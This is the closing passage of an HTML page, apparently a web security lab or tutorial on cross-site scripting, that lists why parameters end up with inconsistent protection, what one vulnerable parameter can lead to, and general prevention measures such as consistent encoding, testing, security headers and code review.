              <div class="col-md-6">
                <h6>Common Mixed Security Scenarios:</h6>
                <ul>
                  <li><strong>Legacy code:</strong> Older parameters may have different security</li>
                  <li><strong>Third-party integrations:</strong> External code may use different approaches</li>
                  <li><strong>Developer inconsistency:</strong> Different teams may implement security differently</li>
                  <li><strong>Feature additions:</strong> New features may not follow established patterns</li>
                </ul>
              </div>
              <div class="col-md-6">
                <h6>Impact of Single Parameter Vulnerability:</h6>
                <ul>
                  <li>Complete application compromise through one entry point</li>
                  <li>Session hijacking through cookie theft</li>
                  <li>Account takeover attacks</li>
                  <li>Data exfiltration and privacy breaches</li>
                  <li>Reputation damage despite overall good security</li>
                </ul>
              </div>
            </div>
            <div class="row mt-3">
              <div class="col-12">
                <h6>Comprehensive Prevention Strategies:</h6>
                <ul>
                  <li><strong>Security consistency:</strong> Apply same security controls to all parameters</li>
                  <li><strong>Context-aware encoding:</strong> Use proper encoding for each output context</li>
                  <li><strong>Comprehensive testing:</strong> Test all parameters with various payloads</li>
                  <li><strong>Parameter discovery:</strong> Use tools to find all parameters during testing</li>
                  <li><strong>Security headers:</strong> Implement CSP, X-XSS-Protection, etc.</li>
                  <li><strong>Code review:</strong> Review all code changes for security consistency</li>
                </ul>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0/dist/js/bootstrap.bundle.min.js"
    integrity="sha384-A3rJD856KowSb7dwlZdYEkO39Gagi7vIsF0jrRAoQmDKKtQBHUuLZ9AsSv4jD4Xa"
    crossorigin="anonymous"></script>
</body>
</html>